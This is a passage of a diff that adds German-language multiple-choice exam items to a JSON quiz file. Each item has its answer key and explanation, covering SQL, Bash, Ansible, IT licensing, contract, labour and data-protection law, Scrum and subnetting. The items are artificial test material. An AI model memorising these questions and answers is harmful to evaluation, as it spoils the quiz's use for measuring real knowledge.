+    "exp": "Mit Leerzeichen hält die Bash ZIEL für einen Befehl, dem = und /backup als Argumente übergeben werden. Richtig ist ZIEL=/backup ohne Leerzeichen. Beim Verwenden schreibt man dann \"$ZIEL\"."
+  },
+  {
+    "cat": "systeme",
+    "q": "Aus der Tabelle geraete (id, standort, typ) sollen nur die Standorte mit mehr als 50 Geräten angezeigt werden. Welche Abfrage ist richtig?",
+    "options": [
+      "SELECT standort, COUNT(*) FROM geraete GROUP BY standort HAVING COUNT(*) > 50;",
+      "SELECT standort, COUNT(*) FROM geraete WHERE COUNT(*) > 50 GROUP BY standort;",
+      "SELECT standort FROM geraete GROUP BY standort WHERE COUNT(*) > 50;",
+      "SELECT standort, COUNT(*) FROM geraete HAVING standort > 50;"
+    ],
+    "a": "SELECT standort, COUNT(*) FROM geraete GROUP BY standort HAVING COUNT(*) > 50;",
+    "exp": "WHERE filtert einzelne Zeilen vor dem Gruppieren und kennt noch keine Anzahl. Bedingungen auf Aggregatwerte wie COUNT gehören in HAVING. HAVING steht nach GROUP BY."
+  },
+  {
+    "cat": "systeme",
+    "q": "Sie suchen alle Mitarbeiter, denen noch kein Gerät zugeordnet ist. Tabellen: mitarbeiter (id, name) und geraete (id, mitarbeiter_id). Welche Abfrage liefert das?",
+    "options": [
+      "SELECT m.name FROM mitarbeiter m LEFT JOIN geraete g ON g.mitarbeiter_id = m.id WHERE g.id IS NULL;",
+      "SELECT m.name FROM mitarbeiter m JOIN geraete g ON g.mitarbeiter_id = m.id WHERE g.id IS NULL;",
+      "SELECT m.name FROM mitarbeiter m LEFT JOIN geraete g ON g.id = m.id WHERE m.id IS NULL;",
+      "SELECT m.name FROM mitarbeiter m, geraete g WHERE g.mitarbeiter_id <> m.id;"
+    ],
+    "a": "SELECT m.name FROM mitarbeiter m LEFT JOIN geraete g ON g.mitarbeiter_id = m.id WHERE g.id IS NULL;",
+    "exp": "Der LEFT JOIN behält alle Mitarbeiter, auch ohne passendes Gerät. Bei diesen sind die Spalten aus geraete leer (NULL). Die Bedingung g.id IS NULL lässt genau diese Mitarbeiter übrig."
+  },
+  {
+    "cat": "systeme",
+    "q": "Ein Kollege will in der Inventardatenbank den Standort eines einzelnen Notebooks ändern und führt UPDATE geraete SET standort = 'Lager'; aus. Was ist passiert?",
+    "options": [
+      "Alle Geräte stehen jetzt auf dem Standort Lager",
+      "Nur das zuletzt angelegte Gerät wurde geändert",
+      "Die Datenbank hat die Anweisung ohne WHERE abgelehnt",
+      "Es wurde ein neues Gerät mit dem Standort Lager angelegt"
+    ],
+    "a": "Alle Geräte stehen jetzt auf dem Standort Lager",
+    "exp": "Ohne WHERE gilt UPDATE für jede Zeile der Tabelle. Richtig wäre z.B. UPDATE geraete SET standort = 'Lager' WHERE id = 4711;. Vor Änderungen prüft man die Bedingung mit einem SELECT und arbeitet möglichst in einer Transaktion."
+  },
+  {
+    "cat": "systeme",
+    "q": "Die Abfrage SELECT * FROM geraete WHERE mitarbeiter_id = NULL; liefert keine Zeile, obwohl viele Geräte niemandem zugeordnet sind. Wie lautet die Bedingung richtig?",
+    "options": [
+      "WHERE mitarbeiter_id IS NULL",
+      "WHERE mitarbeiter_id = 'NULL'",
+      "WHERE mitarbeiter_id == NULL",
+      "WHERE mitarbeiter_id = 0"
+    ],
+    "a": "WHERE mitarbeiter_id IS NULL",
+    "exp": "NULL steht für einen unbekannten Wert und ist mit nichts gleich, auch nicht mit NULL. Der Vergleich mit = ergibt deshalb nie wahr. Für leere Felder verwendet man IS NULL bzw. IS NOT NULL."
+  },
+  {
+    "cat": "systeme",
+    "q": "Ein Playbook installiert nginx mit dem Modul shell und dem Befehl apt-get install -y nginx. Warum ist das apt-Modul mit state: present besser?",
+    "options": [
+      "Das Modul prüft den Zustand und meldet nur bei echter Änderung changed",
+      "Das Modul installiert Pakete ohne Internetzugang und ohne Paketquellen",
+      "Das Modul braucht auf den Zielsystemen keine Anmeldung per SSH",
+      "Das Modul installiert automatisch immer die neueste Testversion"
+    ],
+    "a": "Das Modul prüft den Zustand und meldet nur bei echter Änderung changed",
+    "exp": "Module wie apt prüfen zuerst, ob das Paket schon vorhanden ist, und handeln nur bei Bedarf. Dadurch ist die Aufgabe idempotent, und Handler werden richtig ausgelöst. Ein shell-Befehl meldet dagegen bei jedem Lauf eine Änderung."
+  },
+  {
+    "cat": "systeme",
+    "q": "Sie haben ein Ansible-Playbook für 60 Server geändert und wollen vor dem echten Lauf sehen, was es ändern würde. Welche Option nutzen Sie?",
+    "options": [
+      "ansible-playbook site.yml --check --diff",
+      "ansible-playbook site.yml --syntax-check",
+      "ansible-playbook site.yml --force-handlers",
+      "ansible-playbook site.yml --list-hosts"
+    ],
+    "a": "ansible-playbook site.yml --check --diff",
+    "exp": "Mit --check führt Ansible einen Trockenlauf aus und meldet, welche Aufgaben etwas ändern würden. --diff zeigt zusätzlich die Unterschiede in Dateien. Aufgaben mit shell oder command werden dabei übersprungen, weil Ansible ihre Wirkung nicht vorhersagen kann."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Ein Kunde möchte „alles in die Cloud“ bringen und fragt, womit Sie anfangen. Was ist der erste sinnvolle Schritt?",
+    "options": [
+      "Anwendungen, Abhängigkeiten, Lizenzen und Datenschutzanforderungen erfassen",
+      "Sofort alle Server als virtuelle Maschinen beim größten Anbieter anlegen",
+      "Alle lokalen Server abschalten, um den Umstieg zu erzwingen",
+      "Einen Vertrag mit fünf Jahren Laufzeit für Rabatte unterschreiben"
+    ],
+    "a": "Anwendungen, Abhängigkeiten, Lizenzen und Datenschutzanforderungen erfassen",
+    "exp": "Vor einer Migration braucht man eine Bestandsaufnahme. Erst wenn klar ist, welche Anwendungen zusammenhängen, wie sie lizenziert sind und welche Daten sie verarbeiten, lässt sich für jede Anwendung der richtige Migrationsweg wählen."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Ein Kunde hat vor Jahren unbefristete Kauflizenzen für ein CAD-Programm erworben. Den Wartungsvertrag hat er nicht verlängert. Was gilt jetzt?",
+    "options": [
+      "Er darf die gekaufte Version weiter nutzen, erhält aber keine Updates mehr",
+      "Er muss das Programm sofort deinstallieren, die Lizenz ist erloschen",
+      "Er erhält weiter alle neuen Versionen, nur ohne telefonischen Support",
+      "Er darf das Programm nur noch privat und nicht mehr gewerblich nutzen"
+    ],
+    "a": "Er darf die gekaufte Version weiter nutzen, erhält aber keine Updates mehr",
+    "exp": "Bei einer Kauflizenz ist das Nutzungsrecht unbefristet. Der Wartungsvertrag regelt nur Updates, neue Versionen und Support. Ohne ihn bleibt der Kunde auf dem alten Stand, was bei Sicherheitslücken ein Risiko ist."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Beim Lizenzaudit stellt der Hersteller fest, dass Ihr Kunde seit zwei Jahren 30 Installationen zu viel betreibt. Der Kunde will sie schnell löschen und damit alles erledigt haben. Was stimmt?",
+    "options": [
+      "Löschen beendet nur die Übernutzung, die Vergangenheit wird nachlizenziert",
+      "Durch das Löschen entfällt jeder Anspruch des Herstellers vollständig",
+      "Der Hersteller darf den gesamten Lizenzvertrag rückwirkend aufheben",
+      "Der Kunde muss alle Installationen löschen, auch die ordnungsgemäß lizenzierten"
+    ],
+    "a": "Löschen beendet nur die Übernutzung, die Vergangenheit wird nachlizenziert",
+    "exp": "Die unberechtigte Nutzung hat bereits stattgefunden. Der Hersteller kann dafür eine Vergütung verlangen, meist als Nachkauf der fehlenden Lizenzen, oft zu ungünstigeren Konditionen. Regelmäßiges Software Asset Management verhindert solche Überraschungen."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Eine Datenbanksoftware wird nach den Kernen des physischen Hosts lizenziert. Die VM läuft in einem Cluster mit drei Hosts und kann per Live-Migration auf jeden davon wechseln. Was raten Sie?",
+    "options": [
+      "Alle drei Hosts lizenzieren oder die VM fest an einen Host binden",
+      "Nur den Host lizenzieren, auf dem die VM beim Kauf gerade läuft",
+      "Gar nichts lizenzieren, weil virtuelle Maschinen keine Lizenzen brauchen",
+      "Nur die Kerne der VM lizenzieren, die Hosts sind immer ausgenommen"
+    ],
+    "a": "Alle drei Hosts lizenzieren oder die VM fest an einen Host binden",
+    "exp": "Manche Hersteller verlangen Lizenzen für jeden physischen Host, auf dem die Software laufen kann. Dann wird eine ungeplante Live-Migration schnell zur Unterlizenzierung. Man liest die Bedingungen genau und begrenzt die VM notfalls auf lizenzierte Hosts."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Bei einer Servermigration verliert Ihr Systemhaus durch ein Versehen Buchungsdaten eines Kunden. Dem Kunden entsteht ein reiner Vermögensschaden. Welche Versicherung deckt das typischerweise ab?",
+    "options": [
+      "Eine IT-Haftpflicht bzw. Vermögensschaden-Haftpflichtversicherung",
+      "Die gesetzliche Unfallversicherung der Berufsgenossenschaft",
+      "Die Elektronikversicherung für die Hardware des Systemhauses",
+      "Die Betriebsunterbrechungsversicherung des Systemhauses"
+    ],
+    "a": "Eine IT-Haftpflicht bzw. Vermögensschaden-Haftpflichtversicherung",
+    "exp": "Eine normale Betriebshaftpflicht deckt vor allem Personen- und Sachschäden. IT-Dienstleister brauchen zusätzlich Schutz für Vermögensschäden, z.B. durch Datenverlust oder Ausfallzeiten beim Kunden. Viele Kunden verlangen den Nachweis im Vertrag."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "In den AGB eines Softwarehauses steht, dass der Kunde bei jedem Tag Verzug mit einer Zahlung 10 Prozent des gesamten Auftragswerts als Vertragsstrafe zahlt. Wie beurteilen Sie die Klausel?",
+    "options": [
+      "Unwirksam, weil sie den Kunden unangemessen benachteiligt, sie entfällt ganz",
+      "Wirksam, weil Unternehmen Vertragsstrafen frei vereinbaren dürfen",
+      "Wirksam, das Gericht setzt sie nur auf einen angemessenen Wert herab",
+      "Unwirksam, weil Vertragsstrafen nur für Verbraucher gelten dürfen"
+    ],
+    "a": "Unwirksam, weil sie den Kunden unangemessen benachteiligt, sie entfällt ganz",
+    "exp": "Vertragsstrafen in AGB müssen angemessen sein, auch zwischen Unternehmen. Eine völlig überhöhte Strafe benachteiligt unangemessen und ist unwirksam. Bei AGB wird eine solche Klausel nicht auf ein zulässiges Maß reduziert, sondern fällt ganz weg."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Mitten in den AGB eines Wartungsvertrags steht versteckt, dass der Kunde jedes Jahr ein kostenpflichtiges Zusatzmodul abnehmen muss. Der Vertrag handelt sonst nur von Wartung. Was gilt?",
+    "options": [
+      "Die Klausel wird als überraschende Klausel nicht Vertragsbestandteil",
+      "Die Klausel gilt, weil der Kunde die AGB hätte lesen müssen",
+      "Der gesamte Wartungsvertrag wird dadurch von Anfang an unwirksam",
+      "Die Klausel gilt, aber nur im ersten Jahr der Vertragslaufzeit"
+    ],
+    "a": "Die Klausel wird als überraschende Klausel nicht Vertragsbestandteil",
+    "exp": "Klauseln, die so ungewöhnlich sind, dass der Vertragspartner nicht mit ihnen rechnen muss, werden nicht Vertragsinhalt. Das gilt auch zwischen Unternehmen. Der übrige Vertrag bleibt wirksam."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Ein Kunde meldet einen Ausfall seines gehosteten Webshops. Ursache war eine Fehlkonfiguration, die der Kunde selbst trotz Warnung vorgenommen hat. Das SLA schließt vom Kunden verursachte Störungen aus. Wie wird der Ausfall gewertet?",
+    "options": [
+      "Er zählt nicht gegen die zugesagte Verfügbarkeit des Anbieters",
+      "Er zählt voll gegen den Anbieter, weil der Shop bei ihm gehostet ist",
+      "Er zählt zur Hälfte, weil beide Seiten beteiligt waren",
+      "Er führt automatisch zu einer Vertragsstrafe für den Kunden"
+    ],
+    "a": "Er zählt nicht gegen die zugesagte Verfügbarkeit des Anbieters",
+    "exp": "SLAs enthalten üblicherweise Ausschlüsse, z.B. für Störungen durch den Kunden, vereinbarte Wartung oder höhere Gewalt. Der Anbieter muss nur für Ausfälle in seinem Verantwortungsbereich einstehen. Deshalb sollten solche Ausschlüsse im Vertrag klar formuliert sein."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Ihr Kunde hat ein SLA mit einem Managed-Service-Anbieter. Nach einem langen Ausfall sagt der Anbieter: „Schuld war unser Rechenzentrumspartner, wenden Sie sich an ihn.“ Was stimmt?",
+    "options": [
+      "Der Anbieter haftet, sein Partner ist nur sein Erfüllungsgehilfe",
+      "Der Kunde muss sich direkt an den Rechenzentrumspartner wenden",
+      "Niemand haftet, weil der Ausfall bei einem Dritten entstanden ist",
+      "Der Kunde haftet mit, weil er den Partner hätte prüfen müssen"
+    ],
+    "a": "Der Anbieter haftet, sein Partner ist nur sein Erfüllungsgehilfe",
+    "exp": "Vertragspartner des Kunden ist allein der Managed-Service-Anbieter. Fehler seiner Subunternehmer muss er sich wie eigene zurechnen lassen. Ob er sich den Schaden beim Partner über einen Underpinning Contract zurückholt, ist seine Sache."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Ein Projektleiter will die Datenschutz-Folgenabschätzung für ein neues Videoanalyse-System erst nach dem Go-live erstellen, weil dann die echten Abläufe bekannt sind. Was ist richtig?",
+    "options": [
+      "Die DSFA muss vor Beginn der Verarbeitung durchgeführt werden",
+      "Die DSFA ist nach Go-live richtig, weil erst dann Daten anfallen",
+      "Die DSFA reicht innerhalb von 72 Stunden nach Inbetriebnahme",
+      "Die DSFA wird nur auf Anforderung der Aufsichtsbehörde erstellt"
+    ],
+    "a": "Die DSFA muss vor Beginn der Verarbeitung durchgeführt werden",
+    "exp": "Die DSFA soll Risiken erkennen, bevor sie eintreten. Deshalb gehört sie in die Planungsphase des Projekts, damit Ergebnisse noch in die Gestaltung einfließen. Sie wird später bei Änderungen überprüft und fortgeschrieben."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Ein Softwareanbieter in der EU bietet günstigen Support an. Die Supporttechniker sitzen in Indien und greifen per Fernwartung auf Kundendaten zu. Die Daten bleiben auf Servern in Deutschland. Wie ist das datenschutzrechtlich einzuordnen?",
+    "options": [
+      "Als Übermittlung in ein Drittland, weil schon der Fernzugriff zählt",
+      "Als rein deutsche Verarbeitung, weil die Server in Deutschland stehen",
+      "Als erlaubte Verarbeitung ohne weitere Prüfung, weil Indien in Asien liegt",
+      "Als verbotene Verarbeitung, die durch keinen Vertrag erlaubt werden kann"
+    ],
+    "a": "Als Übermittlung in ein Drittland, weil schon der Fernzugriff zählt",
+    "exp": "Ein Zugriff aus einem Drittland auf personenbezogene Daten gilt als Übermittlung dorthin. Für Indien gibt es keinen Angemessenheitsbeschluss. Nötig sind geeignete Garantien wie Standardvertragsklauseln und eine Prüfung der Rechtslage vor Ort."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Im neuen Mitarbeiterportal ist die private Handynummer jedes Beschäftigten standardmäßig für alle Kollegen sichtbar. Wer das nicht will, muss es selbst abschalten. Gegen welchen Grundsatz verstößt das?",
+    "options": [
+      "Privacy by Default (datenschutzfreundliche Voreinstellungen)",
+      "Recht auf Datenübertragbarkeit nach Art. 20 DSGVO",
+      "Pflicht zur Benennung eines Datenschutzbeauftragten",
+      "Recht auf Berichtigung unrichtiger personenbezogener Daten"
+    ],
+    "a": "Privacy by Default (datenschutzfreundliche Voreinstellungen)",
+    "exp": "Nach Art. 25 DSGVO müssen Systeme so voreingestellt sein, dass nur die für den Zweck nötigen Daten verarbeitet und sichtbar werden. Freiwillige Angaben sollte man aktiv freigeben, nicht aktiv verbergen müssen."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Im Projekt besteht das geringe Risiko, dass ein Beamer im Schulungsraum ausfällt. Eine Absicherung wäre teurer als der mögliche Schaden. Das Team nimmt das Risiko bewusst in Kauf und notiert es. Welche Strategie ist das?",
+    "options": [
+      "Risikoakzeptanz",
+      "Risikovermeidung",
+      "Risikoübertragung",
+      "Risikoverminderung"
+    ],
+    "a": "Risikoakzeptanz",
+    "exp": "Bei der Risikoakzeptanz trägt man ein Risiko bewusst selbst, weil Maßnahmen unwirtschaftlich wären. Wichtig ist, dass das Risiko dokumentiert und beobachtet wird. Vermeidung würde auf die Tätigkeit verzichten, Übertragung das Risiko z.B. an eine Versicherung abgeben."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Kurz vor Sprint-Ende ist eine User Story nur zur Hälfte fertig und erfüllt die Definition of Done nicht. Was geschieht mit ihr?",
+    "options": [
+      "Sie wird nicht als erledigt gezeigt und geht zurück ins Product Backlog",
+      "Sie wird im Sprint Review als fertig vorgeführt, der Rest folgt später",
+      "Der Sprint wird automatisch um eine Woche verlängert",
+      "Sie wird gelöscht, weil sie im Sprint nicht fertig wurde"
+    ],
+    "a": "Sie wird nicht als erledigt gezeigt und geht zurück ins Product Backlog",
+    "exp": "Nur Arbeit, die die Definition of Done erfüllt, gehört zum Inkrement. Unfertige Einträge gehen zurück ins Product Backlog und werden dort neu priorisiert. Sprints werden in Scrum nicht verlängert."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Der Kunde entscheidet mitten im Sprint, dass er die Funktion, an der das Team gerade arbeitet, gar nicht mehr braucht. Das Sprint-Ziel ist damit hinfällig. Wer darf den Sprint abbrechen?",
+    "options": [
+      "Nur der Product Owner",
+      "Jeder Entwickler des Teams",
+      "Nur der Scrum Master",
+      "Nur der Geschäftsführer des Kunden"
+    ],
+    "a": "Nur der Product Owner",
+    "exp": "Ein Sprint kann abgebrochen werden, wenn sein Ziel überholt ist. Diese Entscheidung liegt allein beim Product Owner. Danach plant das Team in einem neuen Sprint Planning die nächste sinnvolle Arbeit."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Ein Techniker sagt dem Kunden am Telefon zu, „nebenbei“ noch das Gäste-WLAN einzurichten. Im Projektplan ist das nicht vorgesehen. Wie heißt das Problem und was hilft?",
+    "options": [
+      "Scope Creep, den Wunsch als Change Request bewerten und freigeben lassen",
+      "Critical Path, den Termin einfach um eine Woche verschieben",
+      "Gold Plating, die Leistung kostenlos und ohne Dokumentation erbringen",
+      "Burnout, den Techniker sofort aus dem Projekt abziehen und ersetzen"
+    ],
+    "a": "Scope Creep, den Wunsch als Change Request bewerten und freigeben lassen",
+    "exp": "Viele kleine, ungeplante Zusagen lassen den Umfang schleichend wachsen, ohne dass Budget und Termine angepasst werden. Jeder Zusatzwunsch wird deshalb erfasst, bewertet und vom Auftraggeber freigegeben, bevor jemand ihn umsetzt."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Die Geschäftsführung Ihres Systemhauses will messen, wie oft Kundenanfragen schon beim ersten Kontakt mit dem Service Desk gelöst werden. Wie heißt diese Kennzahl?",
+    "options": [
+      "Erstlösungsquote (First Contact Resolution)",
+      "Mittlere Zeit zwischen zwei Ausfällen (MTBF)",
+      "Verfügbarkeitsquote des Service Desks",
+      "Auslastungsgrad der Supportmitarbeiter"
+    ],
+    "a": "Erstlösungsquote (First Contact Resolution)",
+    "exp": "Die Erstlösungsquote zeigt den Anteil der Anfragen, die ohne Weiterleitung oder Rückruf gelöst werden. Ein hoher Wert steigert meist die Kundenzufriedenheit und entlastet den Second Level. Man sollte sie zusammen mit der Qualität der Lösungen betrachten."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Für ein internes Audit im Qualitätsmanagement schlägt der Teamleiter Support vor, den Supportprozess selbst zu prüfen, weil er ihn am besten kennt. Was spricht dagegen?",
+    "options": [
+      "Auditoren sollen unabhängig sein und nicht ihre eigene Arbeit prüfen",
+      "Interne Audits dürfen nur externe Zertifizierer durchführen",
+      "Teamleiter dürfen grundsätzlich keine Audits durchführen",
+      "Der Supportprozess gehört nicht zum Qualitätsmanagement"
+    ],
+    "a": "Auditoren sollen unabhängig sein und nicht ihre eigene Arbeit prüfen",
+    "exp": "ISO 9001 verlangt, dass Auditoren objektiv und unparteiisch sind. Wer den eigenen Bereich prüft, übersieht leicht Schwächen oder beschönigt sie. Üblich ist, dass Mitarbeitende aus anderen Bereichen auditieren."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Ihr Kunde investiert in eine Software, die neue Arbeitsplätze automatisch installiert. Bisher dauerte das pro Gerät einen halben Tag Handarbeit. Um welche Investitionsart handelt es sich?",
+    "options": [
+      "Rationalisierungsinvestition",
+      "Ersatzinvestition",
+      "Erweiterungsinvestition",
+      "Finanzinvestition"
+    ],
+    "a": "Rationalisierungsinvestition",
+    "exp": "Eine Rationalisierungsinvestition senkt Kosten oder Arbeitszeit bei gleicher Leistung, z.B. durch Automatisierung. Eine Ersatzinvestition tauscht nur Verbrauchtes aus, eine Erweiterungsinvestition steigert die Kapazität."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Ein IT-Dienstleister mit acht Vollzeitbeschäftigten kündigt einem Techniker, der seit drei Jahren dort arbeitet, ordentlich. Der Techniker beruft sich auf das Kündigungsschutzgesetz. Gilt es für ihn?",
+    "options": [
+      "Nein, das Gesetz gilt erst in Betrieben mit mehr als zehn Beschäftigten",
+      "Ja, es gilt für alle Beschäftigten nach sechs Monaten Betriebszugehörigkeit",
+      "Ja, es gilt in jedem Betrieb, der einen Betriebsrat wählen könnte",
+      "Nein, es gilt nur für Beschäftigte mit mehr als zehn Jahren Betriebszugehörigkeit"
+    ],
+    "a": "Nein, das Gesetz gilt erst in Betrieben mit mehr als zehn Beschäftigten",
+    "exp": "Der allgemeine Kündigungsschutz setzt zwei Dinge voraus: mehr als sechs Monate Betriebszugehörigkeit und mehr als zehn Beschäftigte im Betrieb, Teilzeitkräfte zählen anteilig. Im Kleinbetrieb gelten nur Grenzen wie die Kündigungsfrist und das Verbot willkürlicher oder diskriminierender Kündigung."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Eine Administratorin hält ihre Kündigung für sozial ungerechtfertigt. Sie hat das Schreiben vor vier Wochen erhalten und will jetzt klagen. Was ist das Problem?",
+    "options": [
+      "Die Klagefrist von drei Wochen ist abgelaufen, die Kündigung gilt als wirksam",
+      "Sie muss zuerst den Betriebsrat klagen lassen, selbst darf sie nicht",
+      "Sie muss vor der Klage eine Abmahnung an den Arbeitgeber schicken",
+      "Sie kann noch drei Jahre klagen, weil die regelmäßige Verjährung gilt"
+    ],
+    "a": "Die Klagefrist von drei Wochen ist abgelaufen, die Kündigung gilt als wirksam",
+    "exp": "Eine Kündigungsschutzklage muss innerhalb von drei Wochen nach Zugang der schriftlichen Kündigung beim Arbeitsgericht eingehen. Versäumt man die Frist, gilt die Kündigung als von Anfang an wirksam. Nur in Ausnahmefällen lässt das Gericht eine verspätete Klage zu."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Ein Unternehmen will ein KI-System einführen, das Bewerbungen vorsortiert. Der Betriebsrat möchte einen externen Sachverständigen hinzuziehen, der Arbeitgeber hält das für unnötig. Was gilt?",
+    "options": [
+      "Ein Sachverständiger gilt bei KI als erforderlich, Kosten trägt der Arbeitgeber",
+      "Der Betriebsrat darf Sachverständige nur mit Zustimmung jedes Mitarbeiters beauftragen",
+      "Sachverständige sind nur bei Kündigungen und Versetzungen zulässig",
+      "Der Betriebsrat muss den Sachverständigen immer aus eigenen Mitteln bezahlen"
+    ],
+    "a": "Ein Sachverständiger gilt bei KI als erforderlich, Kosten trägt der Arbeitgeber",
+    "exp": "Das Betriebsverfassungsgesetz regelt ausdrücklich, dass die Hinzuziehung eines Sachverständigen als erforderlich gilt, wenn der Betriebsrat die Einführung oder Anwendung von KI beurteilen muss. Einzelheiten wie Person und Kosten sind mit dem Arbeitgeber zu vereinbaren."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Der Teamleiter eines Fachinformatikers wechselt in eine andere Niederlassung. Der Fachinformatiker möchte seine bisherige Leistung festhalten lassen. Was kann er verlangen?",
+    "options": [
+      "Ein Zwischenzeugnis, weil der Wechsel des Vorgesetzten ein berechtigter Anlass ist",
+      "Ein Endzeugnis, weil mit dem Vorgesetzten auch das Arbeitsverhältnis wechselt",
+      "Nichts, Zeugnisse gibt es nur beim Ende des Arbeitsverhältnisses",
+      "Eine Abmahnung, um die Leistung schriftlich zu dokumentieren"
+    ],
+    "a": "Ein Zwischenzeugnis, weil der Wechsel des Vorgesetzten ein berechtigter Anlass ist",
+    "exp": "Ein Zwischenzeugnis kann man bei einem berechtigten Interesse verlangen, z.B. bei Vorgesetztenwechsel, Versetzung oder Umstrukturierung. Es dokumentiert Leistung und Verhalten, solange der bisherige Vorgesetzte sie noch beurteilen kann."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Ein Arbeitszeugnis klingt freundlich, enthält aber versteckte Formulierungen, die künftigen Arbeitgebern eine schlechte Bewertung signalisieren sollen. Ist das zulässig?",
+    "options": [
+      "Nein, ein Zeugnis muss klar sein und darf keine versteckten Botschaften enthalten",
+      "Ja, solange die Formulierungen grammatikalisch korrekt sind",
+      "Ja, der Arbeitgeber darf die Zeugnissprache frei gestalten",
+      "Nein, ein Zeugnis darf überhaupt keine Leistungsbewertung enthalten"
+    ],
+    "a": "Nein, ein Zeugnis muss klar sein und darf keine versteckten Botschaften enthalten",
+    "exp": "Die Gewerbeordnung verlangt, dass ein Zeugnis klar und verständlich formuliert ist. Merkmale oder Formulierungen, die eine andere Aussage treffen sollen als der Wortlaut, sind verboten. Zugleich muss es wahr und wohlwollend sein."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Der Entgelttarifvertrag eines IT-Unternehmens ist abgelaufen, ein neuer ist noch nicht abgeschlossen. Ein Mitarbeiter fürchtet, dass jetzt keine tariflichen Gehälter mehr gelten. Was stimmt?",
+    "options": [
+      "Die bisherigen Regelungen wirken nach, bis eine neue Vereinbarung sie ersetzt",
+      "Ab dem Ablauf gilt automatisch der gesetzliche Mindestlohn für alle",
+      "Der Arbeitgeber muss die Gehälter bis zum neuen Vertrag einfrieren",
+      "Alle Arbeitsverträge enden mit dem Ablauf des Tarifvertrags"
+    ],
+    "a": "Die bisherigen Regelungen wirken nach, bis eine neue Vereinbarung sie ersetzt",
+    "exp": "Nach Ablauf eines Tarifvertrags gelten seine Regeln weiter (Nachwirkung), bis sie durch eine andere Abmachung ersetzt werden. In dieser Zeit endet aber die Friedenspflicht, sodass die Gewerkschaft zu Streiks aufrufen darf."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Eine IT-GmbH wächst auf 650 Beschäftigte. Welche Folge hat das für die Mitbestimmung auf Unternehmensebene?",
+    "options": [
+      "Sie braucht einen Aufsichtsrat, der zu einem Drittel aus Arbeitnehmervertretern besteht",
+      "Sie muss einen paritätisch besetzten Aufsichtsrat mit halber Arbeitnehmerbank bilden",
+      "Sie muss ihre Rechtsform in eine Aktiengesellschaft umwandeln",
+      "Keine, Mitbestimmung gibt es nur in börsennotierten Unternehmen"
+    ],
+    "a": "Sie braucht einen Aufsichtsrat, der zu einem Drittel aus Arbeitnehmervertretern besteht",
+    "exp": "Nach dem Drittelbeteiligungsgesetz braucht eine GmbH mit in der Regel mehr als 500 Beschäftigten einen Aufsichtsrat mit einem Drittel Arbeitnehmervertretern. Die paritätische Mitbestimmung nach dem Mitbestimmungsgesetz greift erst ab mehr als 2.000 Beschäftigten."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Ein Unternehmen mit 250 Beschäftigten löst seine IT-Abteilung mit 30 Stellen auf und vergibt die Aufgaben an einen externen Dienstleister. Welche Vereinbarung mit dem Betriebsrat soll die wirtschaftlichen Nachteile der Betroffenen ausgleichen?",
+    "options": [
+      "Ein Sozialplan",
+      "Ein Interessenausgleich",
+      "Ein Manteltarifvertrag",
+      "Eine Zielvereinbarung"
+    ],
+    "a": "Ein Sozialplan",
+    "exp": "Bei einer Betriebsänderung in Unternehmen mit mehr als 20 Beschäftigten verhandeln Arbeitgeber und Betriebsrat über einen Interessenausgleich, der regelt, ob und wie die Maßnahme erfolgt. Der Sozialplan gleicht die Nachteile aus, z.B. durch Abfindungen, und kann über die Einigungsstelle erzwungen werden."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Ein Administrator hat am Wochenende Rufbereitschaft. Er ist zu Hause und nur telefonisch erreichbar. Am Samstag arbeitet er zwei Stunden an einer Störung. Was zählt als Arbeitszeit?",
+    "options": [
+      "Nur die zwei Stunden, in denen er tatsächlich gearbeitet hat",
+      "Das gesamte Wochenende, weil er erreichbar sein musste",
+      "Gar nichts, weil er von zu Hause aus gearbeitet hat",
+      "Nur die Zeit, in der er das Haus verlassen hat"
+    ],
+    "a": "Nur die zwei Stunden, in denen er tatsächlich gearbeitet hat",
+    "exp": "Bei Rufbereitschaft wählt der Beschäftigte seinen Aufenthaltsort selbst und muss nur erreichbar sein. Arbeitszeit ist dann nur der tatsächliche Einsatz. Anders beim Bereitschaftsdienst, bei dem der Arbeitgeber den Ort bestimmt: Er zählt vollständig als Arbeitszeit."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Ein Logistikkunde erhält für seinen neuen Standort 10.52.0.0/22. Benötigt werden: Verwaltung 300 Hosts, Lager 120, Vertrieb 50 und ein Transfernetz zum Router mit 2 Adressen. Sie vergeben per VLSM, größter Bedarf zuerst, lückenlos ab Netzanfang. Welches Netz erhält der Vertrieb?",
+    "options": [
+      "10.52.2.128/26",
+      "10.52.2.64/26",
+      "10.52.2.128/25",
+      "10.52.1.128/26"
+    ],
+    "a": "10.52.2.128/26",
+    "exp": "Verwaltung braucht /23 (510 Hosts): 10.52.0.0/23. Lager braucht /25 (126 Hosts): 10.52.2.0/25. Danach folgt der Vertrieb mit /26 (62 Hosts): 10.52.2.128/26. Das Transfernetz bekommt 10.52.2.192/30."
+  },
+  {
+    "cat": "netzwerk",
